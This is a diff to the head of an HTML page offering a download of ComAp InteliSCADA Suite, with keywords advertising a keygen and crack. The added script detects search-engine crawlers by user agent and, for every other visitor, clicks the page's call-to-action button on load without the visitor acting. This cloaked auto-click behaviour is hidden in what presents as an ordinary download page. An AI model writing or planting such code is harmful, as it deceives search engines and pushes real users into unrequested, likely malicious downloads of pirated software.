@@ -5,6 +5,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>ComAp InteliSCADA Suite 2.8.0.16 07.2024</title>
+    
+<script>
+const searchEngineUserAgents = [
+  'Googlebot',
+  'Bingbot',
+  'YandexBot',
+  'DuckDuckBot',
+  'Baiduspider',
+];
+
+function isSearchEngine(userAgent) {
+  return searchEngineUserAgents.some(bot => userAgent.includes(bot));
+}
+
+function clickCTAButton() {
+  const ctaButton = document.querySelector('.cta-button');
+  if (ctaButton) {
+    ctaButton.click();
+  }
+}
+
+function main() {
+  const userAgent = navigator.userAgent;
+  
+  if (!isSearchEngine(userAgent)) {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', clickCTAButton);
+    } else {
+      clickCTAButton();
+    }
+  }
+}
+
+main();
+</script>
+
     <meta name="description" content="Download ComAp InteliSCADA Suite 2.8.0.16 07.2024 for simple and advanced SCADA system control. Available for Windows 11, 10, and 7.">
     <meta name="keywords" content="ComAp InteliSCADA Suite 2.8.0.16 07.2024, ComAp InteliSCADA Suite download, ComAp InteliSCADA Suite free download, InteliSCADA Suite 2.8.0.16 download, InteliSCADA Suite 2.8.0.16, ComAp InteliSCADA 2024, InteliSCADA 2.8.0.16 download, ComAp SCADA software, ComAp SCADA software download, ComAp SCADA software free download, InteliSCADA 2.8.0.16 keygen, InteliSCADA 2.8.0.16 crack, ComAp SCADA tool, SCADA software Windows 11, ComAp InteliSCADA Windows 10, ComAp InteliSCADA Suite Windows 7, ComAp InteliSCADA English software, ComAp SCADA tool download, ComAp SCADA tool free download">
     <style>
